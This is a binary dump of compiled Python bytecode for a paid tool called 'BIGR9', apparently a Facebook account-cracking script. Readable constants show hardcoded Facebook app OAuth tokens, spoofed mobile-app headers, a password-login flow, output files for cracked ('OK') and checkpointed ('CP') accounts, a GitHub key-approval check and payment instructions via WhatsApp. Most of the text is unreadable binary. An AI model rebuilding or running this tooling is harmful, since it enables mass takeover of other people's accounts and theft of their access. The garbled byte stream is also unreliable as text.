\x00\x00\x00\x00\x00\x00\x00\x00j<\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j>\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00$\x00r\x18\x01\x00tA\x00\x00\x00\x00\x00\x00\x00\x00jB\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00dn\xab\x01\x00\x00\x00\x00\x00\x00\x01\x00Y\x00y\x00tD\x00\x00\x00\x00\x00\x00\x00\x00$\x00r\n}\x0eY\x00d\x00}\x0e~\x0ey\x00d\x00}\x0e~\x0ew\x01w\x00x\x03Y\x00w\x01)oNz1\r\r\x1b[1;32m [\x1b[1;32mBIGR9-M2\x1b[1;97m\x1b[1;97m\x1b[1;32m] r\xed\x00\x00\x00r\xee\x00\x00\x00r(\x00\x00\x00r\x02\x00\x00\x00rR\x00\x00\x00r\xef\x00\x00\x00r\xf0\x00\x00\x00r\xf1\x00\x00\x00r\xf2\x00\x00\x00r\xf3\x00\x00\x00r\xf4\x00\x00\x00r\xb6\x01\x00\x00r\xa6\x01\x00\x00r\xa7\x01\x00\x00r\xa4\x01\x00\x00r\xa5\x01\x00\x00z\x0cX-FB-Net-HNIi N\x00\x00i@\x9c\x00\x00z\x0cX-FB-SIM-HNIz\x14X-FB-Connection-Typer\xbd\x01\x00\x00r\xb8\x01\x00\x00z6OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895z\x17X-FB-Connection-Qualityz\x19X-FB-Connection-Bandwidthi\x00-1\x01i\x80\xc3\xc9\x01r\xc6\x01\x00\x00r\xbf\x01\x00\x00z\x0fx-fb-session-idzUnid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62z\x11x-fb-device-group\xda\x045120z\x12X-FB-Friendly-Name\xda\x17ViewerReactionsMutationz\x1bX-FB-Request-Analytics-Tags\xda\x0cgraphservicez\x10X-FB-HTTP-Enginer\xc2\x01\x00\x00z\x0eX-FB-Client-IPr\xc3\x01\x00\x00z\x13X-FB-Server-Clusterz\x15x-fb-connection-token\xda d29d67d37eca387482a8a5b740f84f62rl\x01\x00\x00rm\x01\x00\x00rn\x01\x00\x00ro\x01\x00\x00rr\x01\x00\x00rs\x01\x00\x00rp\x01\x00\x00\xda\x10credentials_type\xda\x1bdevice_based_login_passwordr\x8c\x01\x00\x00r\x8d\x01\x00\x00r\x8e\x01\x00\x00\xda\x0cregister_apiru\x01\x00\x00rv\x01\x00\x00r\xa2\x01\x00\x00z-350685531728|62f8ce9f74b12f84c123cc23437a4a32r\x8b\x01\x00\x00r{\x00\x00\x00r\x93\x01\x00\x00\xda\x07NO_FILE\xda\radvertiser_idr\x96\x01\x00\x00rV\x00\x00\x00r\x97\x01\x00\x00r\t\x00\x00\x00r\x98\x01\x00\x00\xda\x02PKrx\x01\x00\x00r\xc0\x01\x00\x00z3com.facebook.account.login.protocol.Fb4aAuthHandlerr\x9e\x01\x00\x00)\x04rw\x01\x00\x00r\x9a\x01\x00\x00r\x9c\x01\x00\x00r\xa1\x01\x00\x00r\xc7\x01\x00\x00r\xc9\x01\x00\x00r\xcc\x01\x00\x00r\xb7\x00\x00\x00r\xcd\x01\x00\x00r\xce\x01\x00\x00r\xc2\x00\x00\x00z\x07\x1b[1;32mr-\x00\x00\x00c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x003\x00\x00\x00\xf38\x00\x00\x00K\x00\x01\x00\x97\x00|\x00]\x12\x00\x00}\x01|\x01d\x00\x19\x00\x00\x00d\x01z\x00\x00\x00|\x01d\x02\x19\x00\x00\x00z\x00\x00\x00\x96\x01\x97\x01\x01\x00\x8c\x14\x04\x00y\x03\xad\x03w\x01r\xd1\x01\x00\x00r\x8e\x00\x00\x00r\xd4\x01\x00\x00s\x02\x00\x00\x00  r(\x00\x00\x00rh\x01\x00\x00z\x19newidx.<locals>.<genexpr>\x16\x02\x00\x00s$\x00\x00\x00\xe8\x00\xf8\x80\x00\xd0\x1fX\xd1BW\xb8Q\xa0\x01\xa0&\xa1\t\xa8#\xa1\r\xa8a\xb0\x07\xa9j\xd5 8\xd1BW\xf9r\xd6\x01\x00\x00r\xd7\x01\x00\x00\xe9\x12\x00\x00\x00r\xd2\x01\x00\x00ru\x00\x00\x00\xda\x01+rg\x01\x00\x00r\xc4\x00\x00\x00\xda\x01-z\x03sb=z\x1d\x1b[1;32m [\x1a] TOFFEE :-\x1b[1;32m z\x14/sdcard/BIGR9-OK.txtr\xda\x01\x00\x00rw\x00\x00\x00r\xdc\x01\x00\x00r\xdd\x01\x00\x00r\xde\x01\x00\x00\xda\nerror_datar\xdf\x01\x00\x00z\x07\x1b[1;31mz\x14/sdcard/BIGR9-CP.txtrZ\x01\x00\x00)#r\xe2\x01\x00\x00r\xe3\x01\x00\x00r\xe4\x01\x00\x00r\xe5\x01\x00\x00r\xb6\x00\x00\x00r\xd6\x00\x00\x00r\xe6\x01\x00\x00r\xd2\x00\x00\x00r\xe7\x01\x00\x00r\xe8\x01\x00\x00r0\x00\x00\x00r\x1f\x00\x00\x00r\x1d\x00\x00\x00r \x00\x00\x00r\xf0\x01\x00\x00r\xf1\x01\x00\x00r\xd8\x00\x00\x00r\xf2\x01\x00\x00rn\x01\x00\x00r\x8c\x00\x00\x00r\xb9\x00\x00\x00r\xec\x01\x00\x00\xda\x06base64\xda\tb64encoder\x8a\x00\x00\x00\xda\x07urandom\xda\x06decoder\xc6\x00\x00\x00r\xcf\x00\x00\x00r\xd7\x00\x00\x00r\xd9\x00\x00\x00r\xda\x00\x00\x00r\xca\x00\x00\x00r\xcb\x00\x00\x00r\xf4\x01\x00\x00)\x0fr\xe8\x00\x00\x00r\xe9\x00\x00\x00r\xea\x00\x00\x00r\xf6\x01\x00\x00r\xf7\x01\x00\x00r\xf8\x01\x00\x00r\xf9\x01\x00\x00\xda\x04headr\xca\x01\x00\x00r\x0c\x02\x00\x00r\xb7\x00\x00\x00\xda\x04ckkk\xda\x04ssbb\xda\x07cookiesr&\x00\x00\x00s\x0f\x00\x00\x00               r(\x00\x00\x00r\xd5\x00\x00\x00r\xd5\x00\x00\x00\x05\x02\x00\x00s\xba\x06\x00\x00\x80\x00\xf0\x02#\x05\r\xe4\x08\x0b\x8f\n\x89\n\xd7\x08\x18\xd2\x08\x18\xf6\x00\x00}\x01A\x02\xf4\x00\x00B\x02E\x02\xf4\x00\x00F\x02I\x02\xf5\x00\x00B\x02J\x02\xf0\x00\x00\x1aK\x02\xf4\x00\x00\tL\x02\xf4\x00\x00M\x02P\x02\xf7\x00\x00M\x02W\x02\xf1\x00\x00M\x02W\x02\xf7\x00\x00M\x02]\x02\xf1\x00\x00M\x02]\x02\xf4\x00\x00M\x02_\x02\xd8\r\x12\x8f[\x89[\x98\x13\xd3\r\x1d\x98a\xd1\r \x88\x02\xf0\x02\x03\t\x14\xd8\x11\x16\x97\x1b\x91\x1b\x98S\xd3\x11!\xa0!\xd1\x11$\x88B\xf4\x06\x00\x13\x1b\x88B\xd8\x12\x14\x97*\x91*\x98W\xa0R\xa7X\xa1X\xa3Z\xd3\x120\xd7\x128\xd1\x128\xb8\x17\xc0\x12\xd3\x12D\xd7\x12L\xd1\x12L\xc8V\xd0TV\xd7T\\\xd1T\\\xd3T^\xd3\x12_\xd7\x12g\xd1\x12g\xd0hn\xd0oq\xd3\x12r\xd7\x12z\xd1\x12z\xf0\x00\x00|\x01B\x02\xf0\x00\x00C\x02H\x02\xf3\x00\x00\x13I\x02\xf7\x00\x00\x13Q\x02\xf1\x00\x00\x13Q\x02\xf0\x00\x00R\x02X\x02\xf0\x00\x00Y\x02^\x02\xf7\x00\x00Y\x02d\x02\xf1\x00\x00Y\x02d\x02\xf3\x00\x00Y\x02f\x02\xf3\x00\x00\x13g\x02\x88C\xf0\x02\x00\x14X\r\x90L\xd4"3\xd3"5\xf0\x00\x00\x14X\r\xb0n\xd0Fi\xf0\x00\x00\x14X\r\xd0jp\xf0\x00\x00s\x01I\x02\xf0\x00\x00\x14X\r\xf0\x00\x00J\x02X\x02\xf4\x00\x00Z\x02]\x02\xf4\x00\x00^\x02d\x02\xf7\x00\x00^\x02l\x02\xf1\x00\x00^\x02l\x02\xf0\x00\x00m\x02r\x02\xf0\x00\x00t\x02y\x02\xf3\x00\x00^\x02z\x02\xf3\x00\x00Z\x02{\x02\xf0\x00\x00\x14X\r\xf0\x00\x00|\x02J\x03\xf4\x00\x00L\x03O\x03\xf4\x00\x00P\x03V\x03\xf7\x00\x00P\x03^\x03\xf1\x00\x00P\x03^\x03\xf0\x00\x00_\x03d\x03\xf0\x00\x00f\x03k\x03\xf3\x00\x00P\x03l\x03\xf3\x00\x00L\x03m\x03\xf0\x00\x00\x14X\r\xf0\x00\x00n\x03D\x04\xf0\x00\x00F\x04R\x04\xf0\x00\x00\x14X\r\xf0\x00\x00S\x04b\x04\xf0\x00\x00c\x04[\x05\xf0\x00\x00\x14X\r\xf0\x00\x00\\\x05u\x05\xf0\x00\x00v\x05B\x06\xf0\x00\x00\x14X\r\xf0\x00\x00C\x06^\x06\xf4\x00\x00`\x06c\x06\xf4\x00\x00d\x06j\x06\xf7\x00\x00d\x06r\x06\xf1\x00\x00d\x06r\x06\xf0\x00\x00s\x06{\x06\xf0\x00\x00}\x06E\x07\xf3\x00\x00d\x06F\x07\xf3\x00\x00`\x06G\x07\xf0\x00\x00\x14X\r\xf0\x00\x00H\x07Z\x07\xf0\x00\x00\\\x07c\x07\xf0\x00\x00\x14X\r\xf0\x00\x00d\x07u\x07\xf0\x00\x00w\x07N\t\xf0\x00\x00\x14X\r\xf0\x00\x00O\tb\t\xf0\x00\x00d\tj\t\xf0\x00\x00\x14X\r\xf0\x00\x00k\t\x7f\t\xf0\x00\x00A\nZ\n\xf0\x00\x00\x14X\r\xf0\x00\x00[\nx\n\xf0\x00\x00z\nH\x0b\xf0\x00\x00\x14X\r\xf0\x00\x00I\x0b[\x0b\xf0\x00\x00]\x0bd\x0b\xf0\x00\x00\x14X\r\xf0\x00\x00e\x0bu\x0b\xf0\x00\x00w\x0b}\x0b\xf0\x00\x00\x14X\r\xf0\x00\x00~\x0bS\x0c\xf0\x00\x00U\x0c[\x0c\xf0\x00\x00\x14X\r\xf0\x00\x00\\\x0cs\x0c\xf0\x00\x00u\x0cW\r\xf1\x00\x00\x14X\r\x88D\xf0\x02\x00\x15U\x0b\x90V\x9cS\xa4\x14\xa7\x1a\xa1\x1a\xa3\x1c\xd3\x1d.\xf0\x00\x00\x15U\x0b\xa8x\xb8\x16\xf0\x00\x00\x15U\x0b\xc0\x0b\xccS\xd4QU\xd7Q[\xd1Q[\xd3Q]\xd3M^\xf0\x00\x00\x15U\x0b\xd0_d\xd0fl\xf0\x00\x00\x15U\x0b\xd0m\x7f\xf4\x00\x00B\x02E\x02\xf4\x00\x00F\x02J\x02\xf7\x00\x00F\x02P\x02\xf1\x00\x00F\x02P\x02\xf3\x00\x00F\x02R\x02\xf3\x00\x00B\x02S\x02\xf0\x00\x00\x15U\x0b\xf0\x00\x00T\x02f\x02\xf0\x00\x00h\x02E\x03\xf0\x00\x00\x15U\x0b\xf0\x00\x00F\x03Y\x03\xf0\x00\x00[\x03q\x03\xf0\x00\x00\x15U\x0b\xf0\x00\x00r\x03z\x03\xf0\x00\x00|\x03J\x04\xf0\x00\x00\x15U\x0b\xf0\x00\x00K\x04R\x04\xf0\x00\x00T\x04W\x04\xf0\x00\x00\x15U\x0b\xf0\x00\x00X\x04b\x04\xf0\x00\x00d\x04g\x04\xf0\x00\x00\x15U\x0b\xf0\x00\x00h\x04v\x04\xf0\x00\x00x\x04g\x05\xf0\x00\x00\x15U\x0b\xf0\x00\x00h\x05B\x06\xf0\x00\x00D\x06G\x06\xf0\x00\x00\x15U\x0b\xf0\x00\x00H\x06Y\x06\xf0\x00\x00[\x06d\x06\xf0\x00\x00\x15U\x0b\xf0\x00\x00e\x06t\x06\xf4\x00\x00v\x06y\x06\xf4\x00\x00z\x06~\x06\xf7\x00\x00z\x06D\x07\xf1\x00\x00z\x06D\x07\xf3\x00\x00z\x06F\x07\xf3\x00\x00v\x06G\x07\xf0\x00\x00\x15U\x0b\xf0\x00\x00H\x07d\x07\xf0\x00\x00f\x07i\x07\xf0\x00\x00\x15U\x0b\xf0\x00\x00j\x07r\x07\xf0\x00\x00t\x07{\x07\xf0\x00\x00\x15U\x0b\xf0\x00\x00|\x07Q\x08\xf0\x00\x00S\x08W\x08\xf0\x00\x00\x15U\x0b\xf0\x00\x00b\x08n\x08\xf0\x00\x00K\tY\t\xf0\x00\x00q\tf\n\xf0\x00\x00r\nT\x0b\xf2\x00\x00\x15U\x0b\x88D\xdc\x11\x19\x97\x1d\x91\x1d\xd0\x1fH\xc8d\xd0[_\xd4\x11`\xd7\x11e\xd1\x11e\xd3\x11g\x88B\xd8\x0f\x1c\xa0\x02\xd2\x0f"\xdc\x16\x19\x98"\x98U\x99)\x93n\x90\x03\xdc\x10\x15\xd0\x162\xb03\xd1\x166\xb0u\xd1\x16<\xb8S\xd1\x16@\xc0\x13\xd1\x16D\xc4T\xc8#\xc3Y\xd1\x16N\xc8|\xd1\x16[\xd4\x10\\\xd8\x17\x1a\x97x\x91x\xd1\x1fX\xc0"\xd0EV\xd2BW\xd3\x1fX\xd3\x17X\x90\x04\xdc\x17\x1d\xd7\x17\'\xd1\x17\'\xac\x02\xaf\n\xa9\n\xb02\xab\x0e\xd3\x177\xd7\x17>\xd1\x17>\xd3\x17@\xd7\x17H\xd1\x17H\xc8\x13\xc8R\xd3\x17P\xd7\x17X\xd1\x17X\xd0Y\\\xd0]`\xd3\x17a\xd7\x17i\xd1\x17i\xd0jm\xd0nq\xd3\x17r\x90\x04\xd8\x1c\x1f\xa0\x04\x98v\xa0Q\xa0t\xa0f\xd0\x1a-\x90\x07\xdc\x10\x15\xd0\x16;\xb8G\xd1\x16C\xd4\x10D\xdc\x10\x14\xd0\x15+\xa8C\xd3\x100\xd7\x106\xd1\x106\xb0s\xb83\xb1w\xb8s\xb1{\xc03\xb1\x7f\xc0w\xd17N\xc8t\xd17S\xd4\x10T\xdc\x10\x13\x97\n\x91\n\x983\x94\x0f\xd9\x10\x15\xd8\x11#\xa0r\xa8\'\xa1{\xb09\xd1\'=\xd1\x11=\xdc\x16\x19\x98"\x98W\x99+\xa0l\xd1\x1a3\xb0E\xd1\x1a:\xd3\x16;\x90\x03\xdc\x10\x15\xd0\x182\xb0C\xd1\x167\xb8\x05\xd1\x16=\xb8c\xd1\x16A\xc0,\xd1\x16N\xd4\x10O\xdc\x10\x14\xd0\x15+\xa8C\xd3\x100\xd7\x106\xd1\x106\xb0s\xb83\xb1w\xb8s\xb1{\xc04\xd17G\xd4\x10H\xdc\x10\x13\x97\n\x91\n\x983\x94\x0f\xd9\x10\x15\xe1\x10\x18\xf0-\x00\x13\x1b\xf4.\x00\t\r\x88a\x89\x07\x89\x04\xf8\xf03\x01\t\x14\xd8\x11\x13\x8bB\xfb\xf42\x00\x0c\x14\xd7\x0b\x1e\xd1\x0b\x1e\xd7\x0b.\xd1\x0b.\xf2\x00\x01\x05\x17\xdc\x08\x0c\x8f\n\x89\n\x902\x8e\x0e\xdc\x0b\x14\xf2\x00\x01\x05\r\xdc\x08\x0c\xfb\xf0\x03\x01\x05\r\xfas1\x00\x00\x00\x82A)P\x10\x00\xc1,\x14P\x06\x00\xc2\x00N\x05P\x10\x00\xd0\x06\x04P\r\x03\xd0\n\x06P\x10\x00\xd0\x102Q\x16\x03\xd1\x04\x08Q\x16\x03\xd1\x11\x05Q\x16\x03c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x03\x00\x00\x00\xf3\x08\x04\x00\x00\x97\x00t\x01\x00\x00\x00\x00\x00\x00\x00\x00t\x03\x00\x00\x00\x00\x00\x00\x00\x00j\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00t\x01\x00\x00\x00\x00\x00\x00\x00\x00t\x03\x00\x00\x00\x00\x00\x00\x00\x00j\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00z\x00\x00\x00}\x00d\x01j\t\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x00\xab\x01\x00\x00\x00\x00\x00\x00}\x01t\x0b\x00\x00\x00\x00\x00\x00\x00\x00j\x0c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x02\xab\x01\x00\x00\x00\x00\x00\x00j\x0e\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00}\x02|\x01|\x02v\x00r\x0bt\x11\x00\x00\x00\x00\x00\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x01\x00y\x00t\x03\x00\x00\x00\x00\x00\x00\x00\x00j\x12\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x03\xab\x01\x00\x00\x00\x00\x00\x00\x01\x00t\x15\x00\x00\x00\x00\x00\x00\x00\x00t\x16\x00\x00\x00\x00\x00\x00\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x01\x00t\x15\x00\x00\x00\x00\x00\x00\x00\x00d\x04\xab\x01\x00\x00\x00\x00\x00\x00\x01\x00t\x19\x00\x00\x00\x00\x00\x00\x00\x00j\x1a\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x05\xab\x01\x00\x00\x00\x00\x00\x00\x01\x00t\x03\x00\x00\x00\x00\x00\x00\x00\x00j\x12\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x03\xab\x01\x00\x00\x00\x00\x00\x00\x01\x00t\x15\x00\x00\x00\x00\x00\x00\x00\x00t\x16\x00\x00\x00\x00\x00\x00\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x01\x00t\x1d\x00\x00\x00\x00\x00\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x15\x00\x00\x00\x00\x00\x00\x00\x00d\x06\xab\x01\x00\x00\x00\x00\x00\x00\x01\x00t\x1d\x00\x00\x00\x00\x00\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x15\x00\x00\x00\x00\x00\x00\x00\x00d\x07\xab\x01\x00\x00\x00\x00\x00\x00\x01\x00t\x15\x00\x00\x00\x00\x00\x00\x00\x00d\x08\xab\x01\x00\x00\x00\x00\x00\x00\x01\x00t\x15\x00\x00\x00\x00\x00\x00\x00\x00d\t\xab\x01\x00\x00\x00\x00\x00\x00\x01\x00t\x15\x00\x00\x00\x00\x00\x00\x00\x00d\n\xab\x01\x00\x00\x00\x00\x00\x00\x01\x00t\x15\x00\x00\x00\x00\x00\x00\x00\x00d\x0b\xab\x01\x00\x00\x00\x00\x00\x00\x01\x00t\x15\x00\x00\x00\x00\x00\x00\x00\x00d\x0c\xab\x01\x00\x00\x00\x00\x00\x00\x01\x00t\x15\x00\x00\x00\x00\x00\x00\x00\x00d\r\xab\x01\x00\x00\x00\x00\x00\x00\x01\x00t\x15\x00\x00\x00\x00\x00\x00\x00\x00d\x0e\xab\x01\x00\x00\x00\x00\x00\x00\x01\x00t\x15\x00\x00\x00\x00\x00\x00\x00\x00d\x0f\xab\x01\x00\x00\x00\x00\x00\x00\x01\x00t\x1d\x00\x00\x00\x00\x00\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x15\x00\x00\x00\x00\x00\x00\x00\x00d\x10\xab\x01\x00\x00\x00\x00\x00\x00\x01\x00t\x15\x00\x00\x00\x00\x00\x00\x00\x00d\x11\xab\x01\x00\x00\x00\x00\x00\x00\x01\x00t\x1d\x00\x00\x00\x00\x00\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x15\x00\x00\x00\x00\x00\x00\x00\x00d\x12|\x01z\x00\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x01\x00t\x1d\x00\x00\x00\x00\x00\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x1f\x00\x00\x00\x00\x00\x00\x00\x00d\x13\xab\x01\x00\x00\x00\x00\x00\x00}\x03t\x1f\x00\x00\x00\x00\x00\x00\x00\x00d\x14\xab\x01\x00\x00\x00\x00\x00\x00\x01\x00t\x1d\x00\x00\x00\x00\x00\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x19\x00\x00\x00\x00\x00\x00\x00\x00j\x1a\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x15\xab\x01\x00\x00\x00\x00\x00\x00\x01\x00d\x16|\x01z\x00\x00\x00}\x04t\x03\x00\x00\x00\x00\x00\x00\x00\x00j\x12\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x17|\x04z\x00\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x01\x00t!\x00\x00\x00\x00\x00\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x01\x00y\x00)\x18NrV\x00\x00\x00z<https://github.com/monsterrulex/BIGRA/blob/main/Approval.txtr\x89\x00\x00\x00z$\t \x1b[1;32m FIRST GET APPROVAL\x1b[1;37m rR\x00\x00\x00z& YOU NEED TO GET APPROVED FIRST\x1b[1;37mz$ Key not approved contact with adminz\' \x1b[37;41m\t WELCOME TO BIGR9\x1a TOOL \x1b[0;mu-\x00\x00\x00[\xe2\x88\x9a]FREE WALY DOOR RAHO FREE KEY NI MILY GI z<\x1b[1;37m ====================================================z\x1e[A]Contact with me on WhatsAppz\x1e[B]Contact with me on Facebooku/\x00\x00\x00[\xe2\x88\x9a]SEND 450 PKR(OR) 5$ (FOR 15 DAYS APPROVEL)u\x18\x00\x00\x00[\xe2\x88\x9a]JAZZCASH + BINANCE u\'\x00\x00\x00[\xe2\x88\x9a]FOR OTHER COUNTRY BINANCE ACCOUNT u\x1e\x00\x00\x00 \xc3\x97Your Key is Not Approved \xc3\x97u"\x00\x00\x00 \xe2\x88\x9aCOPY AND SEND ME IN WHATSAPP \x1az$ \x1b[1;37m\x1a\x1aYour Key\x1a\x1a : \x1b[1;36mBIGR9\x1az\x11 PUT YOUR NAME : z\x1a \x1aPRESS ENTER TO SEND KEY\x1ag\x00\x00\x00\x00\x00\x00\x0c@z\x08MR-BIGR9z\xd5am start https://wa.me/+923196101378?text=*HELLO*%2C%20*SIR*%20*I*%20*WANT*%20*TO*%20*YOUR*%20*BIGR9\x1a*%20*PAID*%20*TOOL*%20*APPROVAL*%20/%20%20*MY*%20/%20%20*NAME*%20/%20%20*IS*%20/%20%20*+nameMy*%20*Key*%20*:*%20)\x11r\x1f\x00\x00\x00r\x8a\x00\x00\x00\xda\x07geteuid\xda\x08getloginr\xec\x01\x00\x00r\xd8\x00\x00\x00\xda\x03get\xda\x04textr\xcc\x00\x00\x00r\x8b\x00\x00\x00r\x8c\x00\x00\x00r\x8d\x00\x00\x00r\xca\x00\x00\x00r\xcb\x00\x00\x00r\x90\x00\x00\x00r\xc5\x00\x00\x00\xda\tsuperuser)\x05r\xf0\x01\x00\x00\xda\x02id\xda\x04DARKr\xf4\x00\x00\x00\xda\x03tkss\x05\x00\x00\x00     r(\x00\x00\x00r0\x02\x00\x00r0\x02\x00\x00*\x02\x00\x00sn\x01\x00\x00\x80\x00\xdc\x0b\x0e\x8cr\x8fz\x89z\x8b|\xd3\x0b\x1c\x9cs\xa42\xa7;\xa1;\xa3=\xd3\x1f1\xd1\x0b1\x80D\xd8\t\x0c\x8f\x18\x89\x18\x90$\x8b\x1e\x80B\xdc\t\x11\x8f\x1c\x89\x1c\xd0\x16T\xd3\tU\xd7\tZ\xd1\tZ\x80D\xd8\x07\t\x88T\x81z\xdc\x08\x0c\x8d\x06\xe4\x08\n\x8f\t\x89\t\x90\'\xd4\x08\x1a\xdc\x08\r\x8cd\x8c\x0b\xdc\x08\r\xd0\x0e;\xd4\x08<\xdc\x08\x0c\x8f\n\x89\n\x901\x8c\r\xdc\x08\n\x8f\t\x89\t\x90\'\xd4\x08\x1a\xdc\x08\r\x8cd\x8c\x0b\xdc\x08\x0c\x8c\x06\xdc\x08\r\xd0\x0e9\xd4\x08:\xdc\x08\x0c\x8c\x06\xdc\x08\r\xd0\x104\xd4\x086\xdc\x08\r\xd0\x0f=\xd4\x08>\xdc\x08\r\xd0\x10=\xd4\x08?\xdc\x08\r\xd0\x0eN\xd4\x08O\xdc\x08\r\xd0\x10.\xd4\x080\xdc\x08\r\xd0\x10.\xd4\x080\xdc\x08\r\xd0\x10?\xd4\x08A\xdc\x08\r\xd0\x10(\xd4\x08*\xdc\x08\r\xd0\x107\xd4\x089\xdc\x08\x0c\x8c\x06\xdc\x08\r\xd0\x0e.\xd4\x08/\xdc\x08\r\xd0\x0e2\xd4\x083\xdc\x08\x0c\x8c\x06\xdc\x08\r\xd0\x0f@\xc0\x12\xd1\x0fC\xd4\x08D\xc4T\xc4V\xdc\x0f\x14\xd0\x15(\xd3\x0f)\x88\x04\xdc\x08\r\xd0\x0e*\xd4\x08+\xacD\xacF\xdc\x08\x0c\x8f\n\x89\n\x903\x8c\x0f\xd8\x0e\x1b\x98B\xd1\x0e\x1e\x88\x03\xdc\x08\n\x8f\t\x89\t\xf0\x00\x00\x13j\x03\xf0\x00\x00m\x03p\x03\xf1\x00\x00\x13p\x03\xf4\x00\x00\tq\x03\xdc\x08\x11\x8d\x0br*\x00\x00\x00)Rr\x8a\x00\x00\x00rn\x01\x00\x00r\xca\x00\x00\x00\xda\x04zlib\xda\x0cPyInit_BIGR9r\xe2\x01\x00\x00r\x8c\x00\x00\x00r\x8b\x00\x00\x00\xda\x02rer#\x02\x00\x00r\xf0\x01\x00\x00r\xee\x01\x00\x00r\xd8\x00\x00\x00r\x1d\x00\x00\x00\xda\nsubprocess\xda\x08platform\xda\x12concurrent.futuresr\x04\x00\x00\x00r\xd1\x00\x00\x00\xda\x13ModuleNotFoundErrorr\xdb\x00\x00\x00r\xd6\x00\x00\x00r\xd7\x00\x00\x00r\xe5\x01\x00\x00\xda\x03apkr\xf1\x01\x00\x00\xda\x03hex\xda\x05upper\xda\x04myidr)\x00\x00\x00r0\x00\x00\x00\xda\x04ugenr\xce\x00\x00\x00\xda\x05agent\xda\x02aar\x1e\x00\x00\x00\xda\x01b\xda\x01c\xda\x01dr!\x00\x00\x00r&\x00\x00\x00\xda\x01f\xda\x01g\xda\x01hr\xe3\x00\x00\x00\xda\x01jrY\x01\x00\x00\xda\x01l\xda\x08fullagntr\xcf\x00\x00\x00\xda\x04fbks\xda\x07samsungr\xea\x01\x00\x00\xda\x0ccheck_outputr&\x02\x00\x00r\xe7\x01\x00\x00r~\x00\x00\x00r\x7f\x00\x00\x00r\x80\x00\x00\x00r\x81\x00\x00\x00r\xd2\x00\x00\x00r$\x00\x00\x00r\x82\x00\x00\x00r\x83\x00\x00\x00r\x84\x00\x00\x00r\x85\x00\x00\x00r\x86\x00\x00\x00r\x87\x00\x00\x00\xda\x05total\xda\x06selectr\xf4\x01\x00\x00r\xe9\x01\x00\x00r\x89\x00\x00\x00r\x8d\x00\x00\x00r\x90\x00\x00\x00r\xd0\x00\x00\x00\xda\x02ckr\xb9\x00\x00\x00r\xcc\x00\x00\x00r\xd5\x00\x00\x00r\xd4\x00\x00\x00r0\x02\x00\x00r\x8e\x00\x00\x00r*\x00\x00\x00r(\x00\x00\x00\xda\x08<module>rQ\x02\x00\x00\x01\x00\x00\x00s\x0f\x06\x00\x00\xf0\x03\x01\x01\x01\xf7\x06\x00\x01\x0f\xdf\x00\x13\xd3\x00\x13\xdb\x00\x13\xdb\x00\n\xd9\x00\x05\xd0\x06/\xd4\x000\xd8\x00\t\x80\x02\x87\t\x81\t\xd0\nE\xd4\x00F\xf0\x02\x07\x01\x08\xdf\x01E\xd7\x01E\xd7\x01E\xd7\x01E\xd3\x01E\xdc\x01\x15\xdd\x01:\xf0\n\x00\x12\x14\x90B\x90q\x98\x12\x90\x1a\xd1\x00\x10\x80\x03\x80C\x88\x04\x88S\xd8\x05\x0f\x80T\x87Z\x81Z\x83\\\xd7\x05\x15\xd1\x05\x15\x90b\x90q\xd0\x05\x19\xd7\x05\x1f\xd1\x05\x1f\xd3\x05!\x80\x04\xf2\x04\x07\x01\x0e\xf2\x12\x05\x01\x13\xf0\x10\x00\x06\x08\x80\x04\xd9\r\x12\x904\x8e[\x80E\xd8\x0b)\x88\x02\xd8\n\x17\x88&\x8f-\x89-\xd2\x188\xd3\n9\x88\x01\xd8\n+\x88\x01\xd8\n\x17\x88&\x8f-\x89-\xf2\x00\x00\x19Z\x02\xf3\x00\x00\x0b[\x02\x88\x01\xd8\n\x1a\x88&\xd7\n\x1a\xd1\n\x1a\x981\x98c\xd3\n"\x88\x01\xd8\n\x17\x88&\x8f-\x89-\xf2\x00\x00\x19Z\x02\xf3\x00\x00\x0b[\x02\x88\x01\xd8\nR\x88\x01\xd8\n\x1a\x88&\xd7\n\x1a\xd1\n\x1a\x982\x98b\xd3\n